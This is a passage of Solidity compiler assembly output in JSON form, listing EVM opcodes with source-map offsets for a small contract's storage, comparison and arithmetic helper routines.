											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 412,
											"end": 469,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 494,
											"end": 504,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 482,
											"end": 490,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 482,
											"end": 490,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 482,
											"end": 504,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 478,
											"end": 531,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 478,
											"end": 531,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 478,
											"end": 531,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 515,
											"end": 523,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 515,
											"end": 523,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 515,
											"end": 523,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 478,
											"end": 531,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 478,
											"end": 531,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 550,
											"end": 560,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 547,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 539,
											"end": 560,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 539,
											"end": 560,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 539,
											"end": 560,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 539,
											"end": 560,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 567,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 599,
											"end": 605,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 599,
											"end": 605,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 586,
											"end": 596,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 586,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 586,
											"end": 605,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 586,
											"end": 605,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 586,
											"end": 605,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 567,
											"end": 605,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 567,
											"end": 605,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 612,
											"end": 621,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 636,
											"end": 637,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 624,
											"end": 632,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 624,
											"end": 637,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 624,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 647,
											"end": 652,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 624,
											"end": 652,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 640,
											"end": 644,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 624,
											"end": 652,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 612,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 612,
											"end": 652,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 673,
											"end": 679,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 669,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 665,
											"end": 679,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 661,
											"end": 798,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 661,
											"end": 798,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 661,
											"end": 798,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 690,
											"end": 705,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 690,
											"end": 705,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 690,
											"end": 707,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 690,
											"end": 707,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 723,
											"end": 727,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 716,
											"end": 727,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 716,
											"end": 727,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 716,
											"end": 727,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 661,
											"end": 798,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 661,
											"end": 798,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 768,
											"end": 769,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 750,
											"end": 765,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 750,
											"end": 769,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 785,
											"end": 790,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 778,
											"end": 790,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 50,
											"end": 55,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 94,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 75,
											"end": 95,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 66,
											"end": 95,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 66,
											"end": 95,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 128,
											"end": 133,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 146,
											"end": 469,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 146,
											"end": 469,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 202,
											"end": 208,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 253,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 239,
											"end": 248,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 230,
											"end": 237,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 226,
											"end": 249,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 222,
											"end": 254,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 219,
											"end": 338,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 219,
											"end": 338,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 338,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 257,
											"end": 336,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 257,
											"end": 336,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 219,
											"end": 338,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 338,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 377,
											"end": 378,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 444,
											"end": 451,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 435,
											"end": 441,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 424,
											"end": 433,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 420,
											"end": 442,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 402,
											"end": 452,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 402,
											"end": 452,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 392,
											"end": 452,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 392,
											"end": 452,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 348,
											"end": 462,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 146,
											"end": 469,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 475,
											"end": 584,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 475,
											"end": 584,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 556,
											"end": 577,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 571,
											"end": 576,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 556,
											"end": 577,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 556,
											"end": 577,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 556,
											"end": 577,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 556,
											"end": 577,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 551,
											"end": 554,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 544,
											"end": 578,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 475,
											"end": 584,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 475,
											"end": 584,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 475,
											"end": 584,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 590,
											"end": 708,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 590,
											"end": 708,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 677,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 695,
											"end": 700,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 677,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 677,
											"end": 701,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 677,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 677,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 672,
											"end": 675,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 665,
											"end": 702,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 590,
											"end": 708,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 590,
											"end": 708,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 590,
											"end": 708,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 714,
											"end": 924,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 714,
											"end": 924,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 801,
											"end": 805,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 839,
											"end": 841,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 828,
											"end": 837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 824,
											"end": 842,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 816,
											"end": 842,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 816,
											"end": 842,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 852,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 914,
											"end": 915,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 903,
											"end": 912,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 899,
											"end": 916,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 890,
											"end": 896,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 852,
											"end": 917,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 852,
											"end": 917,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 852,
											"end": 917,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 852,
											"end": 917,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 714,
											"end": 924,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1027,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1061,
											"end": 1063,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1050,
											"end": 1059,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1046,
											"end": 1064,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1038,
											"end": 1064,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1038,
											"end": 1064,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1142,
											"end": 1143,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1131,
											"end": 1140,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1127,
											"end": 1144,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1118,
											"end": 1124,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1074,
											"end": 1145,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 930,
											"end": 1152,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1279,
											"end": 1280,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1314,
											"end": 1315,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1296,
											"end": 1316,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1291,
											"end": 1316,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1291,
											"end": 1316,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1348,
											"end": 1349,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1330,
											"end": 1350,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1350,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1350,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1369,
											"end": 1370,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "tag",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1359,
											"end": 1394,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1416,
											"end": 1417,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1413,
											"end": 1414,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1409,
											"end": 1418,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1404,
											"end": 1418,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1404,
											"end": 1418,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1239,
											"end": 1424,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1470,
											"end": 1474,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1508,
											"end": 1509,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1490,
											"end": 1510,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1485,
											"end": 1510,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1485,
											"end": 1510,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1542,
											"end": 1543,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "tag",
											"source": 1,
											"value": "59"
										},
										{
											"begin": 1524,
											"end": 1544,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1544,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1519,
											"end": 1544,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1563,
											"end": 1564,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1560,
											"end": 1561,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1557,
											"end": 1565,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1568,
											"end": 1586,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "tag",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1554,
											"end": 1588,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1613,
											"end": 1614,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1610,
											"end": 1611,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1606,
											"end": 1615,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1598,
											"end": 1615,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1598,
											"end": 1615,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1430,
											"end": 1621,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1661,
											"end": 1668,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1704,
											"end": 1709,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1697,
											"end": 1710,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1690,
											"end": 1711,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1679,
											"end": 1711,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1679,
											"end": 1711,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1627,
											"end": 1717,
											"name": "JUMP",
											"source": 1,
